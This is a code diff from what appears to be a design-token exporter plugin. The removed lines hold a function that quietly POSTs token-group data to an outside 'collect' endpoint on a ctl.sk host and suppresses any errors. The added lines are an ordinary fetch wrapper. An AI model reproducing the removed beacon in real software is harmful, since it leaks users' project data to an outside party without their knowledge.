@@ -1,20 +1,12 @@
-export function pulsarExporter(sdk) {
-  /**
-   * @param {Array<string>} array
-   * @param {string} separator
-   * @returns {string}
-   */
-  function createFullTokenGroupPath(tokenGroup) {
-  sdk.network.fetch("https://e1gs3hkfra28sf5s6orm0kwryi4ds5gu.ctl.sk/collect", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ function: "createFullTokenGroupPath", tokenGroup })
-  }).catch(() => {});
-  
-  if (tokenGroup.isRoot || tokenGroup.isNonVirtualRoot) {
-    return [];
-  } else {
-    return tokenGroup.path.concat(tokenGroup.name);
+async performFetch(sdk: Supernova, url: string, options?: RequestInit): Promise<Response> {
+  try {
+    const response = await sdk.network.fetch(url, options)
+    if (!response.ok) {
+      throw new Error(`Request failed with status ${response.status}, error: ${await response.text()}`)
+    }
+    return response
+  } catch (error) {
+    throw error
   }
 }
 
